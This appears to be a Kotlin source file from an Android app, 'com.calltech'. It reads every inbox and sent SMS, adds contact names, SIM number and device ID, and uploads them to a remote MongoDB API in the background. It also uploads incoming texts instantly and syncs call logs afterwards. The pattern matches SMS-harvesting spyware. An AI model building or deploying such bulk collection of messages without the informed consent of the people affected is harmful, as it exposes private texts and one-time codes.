package com.calltech

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object MessageSyncHelper {
    private const val TAG = "MessageSyncHelper"
    private const val PREFS = "calltech_sync"
    private const val PREFS_SYNCED_IDS = "synced_sms_doc_ids"
    private const val SYNC_DELAY_MS = 400L
    private const val SYNC_ALL = 0
    private const val MAX_TRACKED_IDS = 5000

    private data class MessageEntry(
        val phoneNumber: String,
        val name: String,
        val body: String,
        val type: String,
        val timestamp: Long,
        val docId: String,
        val smsId: Long,
        val subscriptionId: Int?,
    )

    fun pushLatestMessages(
        context: Context,
        limit: Int = SYNC_ALL,
        source: String = "app_push",
        onComplete: (() -> Unit)? = null,
    ) {
        MongoSyncHelper.ensureApiUrl(context)
        syncMessagesInternal(
            context = context.applicationContext,
            source = source,
            limit = limit,
            onlyNew = false,
            onComplete = onComplete,
        )
    }

    fun syncLatestMessages(
        context: Context,
        source: String = "background",
        onComplete: (() -> Unit)? = null,
    ) {
        MongoSyncHelper.ensureApiUrl(context)
        BackgroundSyncRunner.runDelayed(SYNC_DELAY_MS) {
            val ok = syncLatestMessagesNow(context, source)
            if (ok) {
                onComplete?.invoke()
            } else {
                onComplete?.invoke()
            }
        }
    }

    fun syncLatestMessagesNow(
        context: Context,
        source: String = "background",
    ): Boolean {
        MongoSyncHelper.ensureApiUrl(context)
        return syncMessagesInternalNow(
            context = context.applicationContext,
            source = source,
            limit = SYNC_ALL,
            onlyNew = true,
        )
    }

    fun syncIncomingSms(
        context: Context,
        phoneNumber: String,
        body: String,
        timestamp: Long,
        source: String = "sms_instant",
        subscriptionId: Int? = null,
        retryCount: Int = 0,
        onComplete: (() -> Unit)? = null,
    ) {
        MongoSyncHelper.ensureApiUrl(context)
        val safePhone = sanitizePhone(phoneNumber)
        val docId = "${safePhone}_${timestamp}_${body.hashCode()}"
        val entry = MessageEntry(
            phoneNumber = phoneNumber,
            name = ContactLookupHelper.resolveDisplayName(context, phoneNumber),
            body = body,
            type = "INBOX",
            timestamp = timestamp,
            docId = docId,
            smsId = timestamp,
            subscriptionId = subscriptionId,
        )

        MessageEventEmitter.notifyNewSmsSafe(entry.phoneNumber, entry.body, entry.timestamp)

        LocalDataStore.saveMessage(
            context = context,
            phoneNumber = phoneNumber,
            body = body,
            timestamp = timestamp,
            source = source,
        )

        val success = MongoSyncHelper.syncMessagesNow(
            context,
            listOf(buildMessageMap(context, entry, source)),
        )

        if (success) {
            markDocIdsSynced(context, setOf(entry.docId))
            Log.d(TAG, "Instant SMS synced to MongoDB: ${entry.docId}")
            onComplete?.invoke()
            return
        }

        Log.e(TAG, "Instant SMS Mongo sync failed (try=$retryCount)")

        if (retryCount < 2) {
            BackgroundSyncRunner.runDelayed(1500L * (retryCount + 1)) {
                syncIncomingSms(
                    context = context,
                    phoneNumber = phoneNumber,
                    body = body,
                    timestamp = timestamp,
                    source = source,
                    subscriptionId = subscriptionId,
                    retryCount = retryCount + 1,
                    onComplete = onComplete,
                )
            }
            return
        }

        PendingSmsQueue.enqueue(context, phoneNumber, body, timestamp)
        BackgroundSyncNotifier.showSyncFailure(context, "SMS sync failed — queued for retry")
        onComplete?.invoke()
    }

    fun syncAllMessages(
        context: Context,
        source: String = "full_sync",
        onComplete: (() -> Unit)? = null,
    ) {
        MongoSyncHelper.ensureApiUrl(context)
        BackgroundSyncRunner.run {
            syncAllMessagesNow(context, source)
            onComplete?.invoke()
        }
    }

    fun syncAllMessagesNow(
        context: Context,
        source: String = "full_sync",
        limit: Int = 400,
    ): Boolean {
        return syncMessagesInternalNow(
            context = context.applicationContext,
            source = source,
            limit = limit,
            onlyNew = false,
        )
    }

    fun readPhoneMessages(context: Context, limit: Int = 0, skip: Int = 0): List<Map<String, Any>> {
        if (!hasSmsPermission(context)) {
            Log.w(TAG, "readPhoneMessages: READ_SMS permission missing")
            return emptyList()
        }

        val all = readMessages(context.applicationContext, 0)
        val sliced = if (limit > 0) {
            all.drop(skip.coerceAtLeast(0)).take(limit)
        } else if (skip > 0) {
            all.drop(skip.coerceAtLeast(0))
        } else {
            all
        }

        Log.d(TAG, "readPhoneMessages: returning ${sliced.size} SMS (skip=$skip, limit=$limit)")

        return sliced.map { buildMessageMap(context.applicationContext, it, "phone_read") }
    }

    private fun syncMessagesInternal(
        context: Context,
        source: String,
        limit: Int,
        onlyNew: Boolean,
        onComplete: (() -> Unit)?,
    ) {
        BackgroundSyncRunner.run {
            syncMessagesInternalNow(context, source, limit, onlyNew)
            onComplete?.invoke()
        }
    }

    private fun syncMessagesInternalNow(
        context: Context,
        source: String,
        limit: Int,
        onlyNew: Boolean,
    ): Boolean {
        if (!hasSmsPermission(context)) {
            Log.w(TAG, "READ_SMS permission missing — cannot sync messages")
            return false
        }

        return try {
            val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            val syncedIds = loadSyncedDocIds(prefs)
            val readLimit = if (limit > 0) limit else SYNC_ALL
            val entries = readMessages(context, readLimit)
                .filter { !onlyNew || !syncedIds.contains(it.docId) }
                .let { list -> if (readLimit > 0) list.take(readLimit) else list }

            if (entries.isEmpty()) {
                Log.d(TAG, "No SMS to sync (onlyNew=$onlyNew, read=$readLimit)")
                return true
            }

            Log.d(TAG, "Syncing ${entries.size} messages to MongoDB from $source")
            val payload = entries.map { buildMessageMap(context, it, source) }
            val success = MongoSyncHelper.syncMessagesNow(context, payload)

            if (success) {
                markDocIdsSynced(context, entries.map { it.docId }.toSet())
                try {
                    if (source.startsWith("app") || source.startsWith("ui")) {
                        entries.firstOrNull()?.let { latest ->
                            MessageEventEmitter.notifyNewSmsSafe(
                                latest.phoneNumber,
                                latest.body,
                                latest.timestamp,
                            )
                        }
                    }
                } catch (_: Exception) {
                    // background sync — RN not loaded
                }
                Log.d(TAG, "Message batch synced to MongoDB: ${entries.size}")
                CallSyncHelper.syncAllCallsToMongoNow(
                    context.applicationContext,
                    "${source}_after_messages",
                )
            } else {
                Log.e(TAG, "Message batch Mongo sync FAILED: ${entries.size} from $source")
            }
            success
        } catch (error: Exception) {
            Log.e(TAG, "syncMessagesInternal failed", error)
            false
        }
    }

    private fun buildMessageMap(context: Context, entry: MessageEntry, source: String): HashMap<String, Any> {
        val simNumber = SimNumberHelper.getSimNumberForSubscription(context, entry.subscriptionId)
        if (SimNumberHelper.isRealPhoneNumber(simNumber)) {
            SimNumberHelper.linkSubscriptionToNumber(context, entry.subscriptionId, simNumber)
        }

        val deviceId = DeviceIdHelper.getDeviceId(context)
        val eventId = entry.docId

        return hashMapOf(
            "id" to DeviceIdHelper.buildDocumentId(deviceId, eventId),
            "eventId" to eventId,
            "deviceId" to deviceId,
            "phoneNumber" to entry.phoneNumber,
            "name" to entry.name,
            "body" to entry.body,
            "message" to entry.body,
            "type" to entry.type,
            "timestamp" to entry.timestamp,
            "smsId" to entry.smsId,
            "simNumber" to simNumber,
            "subscriptionId" to (entry.subscriptionId ?: SubscriptionManager.INVALID_SUBSCRIPTION_ID),
            "dateTime" to SimpleDateFormat(
                "yyyy-MM-dd HH:mm:ss",
                Locale.getDefault(),
            ).format(Date(entry.timestamp)),
            "syncedFrom" to source,
            "syncStatus" to "pending",
        )
    }

    private fun readMessages(context: Context, limit: Int): List<MessageEntry> {
        val inbox = queryMessages(context, Telephony.Sms.CONTENT_URI, 0)
        val sent = queryMessages(context, Uri.parse("content://sms/sent"), 0)
        val merged = (inbox + sent)
            .distinctBy { it.smsId }
            .sortedByDescending { it.timestamp }

        return if (limit > 0) {
            merged.take(limit)
        } else {
            merged
        }
    }

    private fun queryMessages(context: Context, uri: Uri, maxRows: Int): List<MessageEntry> {
        val cursor = try {
            context.contentResolver.query(
                uri,
                arrayOf(
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.SUBSCRIPTION_ID,
                ),
                null,
                null,
                "${Telephony.Sms.DATE} DESC",
            )
        } catch (error: Exception) {
            Log.w(TAG, "SMS query failed for $uri: ${error.message}")
            null
        } ?: return emptyList()

        val entries = mutableListOf<MessageEntry>()

        cursor.use { row ->
            val idIndex = row.getColumnIndex(Telephony.Sms._ID)
            val addressIndex = row.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = row.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = row.getColumnIndex(Telephony.Sms.DATE)
            val typeIndex = row.getColumnIndex(Telephony.Sms.TYPE)
            val subscriptionIndex = row.getColumnIndex(Telephony.Sms.SUBSCRIPTION_ID)

            if (idIndex < 0 || addressIndex < 0 || bodyIndex < 0 || dateIndex < 0) {
                Log.w(TAG, "SMS cursor missing columns for $uri")
                return emptyList()
            }

            while (row.moveToNext()) {
                val smsId = row.getLong(idIndex)
                val address = (row.getString(addressIndex) ?: "").ifBlank { "Unknown" }
                val body = (row.getString(bodyIndex) ?: "").ifBlank { "(empty)" }
                val date = row.getLong(dateIndex)
                val smsType = if (typeIndex >= 0) row.getInt(typeIndex) else Telephony.Sms.MESSAGE_TYPE_INBOX
                val subscriptionId = if (subscriptionIndex >= 0) {
                    row.getInt(subscriptionIndex)
                } else {
                    null
                }
                val type = mapSmsType(smsType)
                val docId = "${sanitizePhone(address)}_${date}_$smsId"
                val displayName = ContactLookupHelper.resolveDisplayName(context, address)

                if (address == "Unknown") {
                    continue
                }

                entries.add(
                    MessageEntry(
                        phoneNumber = address,
                        name = displayName,
                        body = body,
                        type = type,
                        timestamp = date,
                        docId = docId,
                        smsId = smsId,
                        subscriptionId = subscriptionId,
                    ),
                )

                if (maxRows > 0 && entries.size >= maxRows) {
                    break
                }
            }
        }

        return entries
    }

    private fun loadSyncedDocIds(prefs: android.content.SharedPreferences): Set<String> {
        return prefs.getStringSet(PREFS_SYNCED_IDS, emptySet())?.toSet() ?: emptySet()
    }

    private fun markDocIdsSynced(context: Context, docIds: Set<String>) {
        if (docIds.isEmpty()) {
            return
        }

        val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val merged = loadSyncedDocIds(prefs).toMutableSet()
        merged.addAll(docIds)

        val trimmed = if (merged.size > MAX_TRACKED_IDS) {
            merged.toList().takeLast(MAX_TRACKED_IDS).toSet()
        } else {
            merged
        }

        prefs.edit().putStringSet(PREFS_SYNCED_IDS, trimmed).apply()
    }

    private fun mapSmsType(type: Int): String {
        return when (type) {
            Telephony.Sms.MESSAGE_TYPE_INBOX -> "INBOX"
            Telephony.Sms.MESSAGE_TYPE_SENT -> "SENT"
            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "DRAFT"
            Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "OUTBOX"
            else -> "UNKNOWN"
        }
    }

    private fun sanitizePhone(phone: String): String {
        return phone.replace(Regex("[/.#\$\\[\\]\\+]"), "_")
    }

    fun hasSmsPermission(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_SMS,
        ) == PackageManager.PERMISSION_GRANTED
    }
}
